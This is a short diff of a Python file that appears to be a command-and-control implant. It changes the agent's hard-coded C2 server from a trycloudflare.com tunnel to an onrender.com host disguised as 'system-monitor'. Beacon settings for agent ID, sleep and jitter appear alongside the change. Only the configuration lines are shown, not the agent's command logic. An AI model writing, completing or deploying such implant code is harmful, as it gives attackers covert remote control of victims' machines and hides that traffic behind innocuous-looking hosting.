@@ -7,7 +7,7 @@ from urllib.error import URLError
 from base64 import b64encode, b64decode
 
 # ─── Configuration (auto-injected by server) ──────────────────────────────────
-C2_URL   = os.environ.get("C2_URL",    "https://likelihood-lightweight-crossing-covering.trycloudflare.com")
+C2_URL   = os.environ.get("C2_URL",    "https://system-monitor-6dru.onrender.com")
 AGENT_ID = os.environ.get("AGENT_ID",  str(uuid.uuid4()))
 SLEEP    = int(os.environ.get("SLEEP",  "5"))
 JITTER   = int(os.environ.get("JITTER", "10"))
